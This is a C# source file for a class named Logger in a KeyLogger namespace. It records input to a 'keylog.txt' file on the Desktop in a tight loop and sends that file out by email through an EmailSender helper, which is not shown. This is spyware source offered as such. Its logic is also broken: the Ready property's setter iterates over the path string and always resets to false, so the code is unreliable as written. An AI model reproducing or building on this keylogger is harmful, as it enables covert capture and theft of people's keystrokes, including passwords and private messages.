using System;
using System.IO;
using System.Threading;

namespace KeyLogger
{
    class Logger
    {
        FileDecorator fileDecorator;
        EmailSender emailSender;
        string folder;
        string file;
        private bool _ready;

        private bool Ready
        {
            get
            {
                return _ready;
            }
            set
            {
                using (StreamReader sr = new StreamReader(file))
                {
                    for (int i = 1; i <= file.Length; i++)
                    {
                        if (i % 100 == 0)
                        {
                            _ready = true;
                        }
                    }
                }

                _ready = false;
            }
        }

        public Logger()
        {
            fileDecorator = new FileDecorator();
            emailSender = new EmailSender();
            folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            file = folder + @"\keylog.txt";
        }

        public void Start()
        {
            fileDecorator.CreateFile();

            while (true)
            {
                Thread.Sleep(5);
                file = fileDecorator.WriteFile();

                if (Ready)
                {
                    emailSender.SendMessage(file);
                }
            }
        }
    }
}
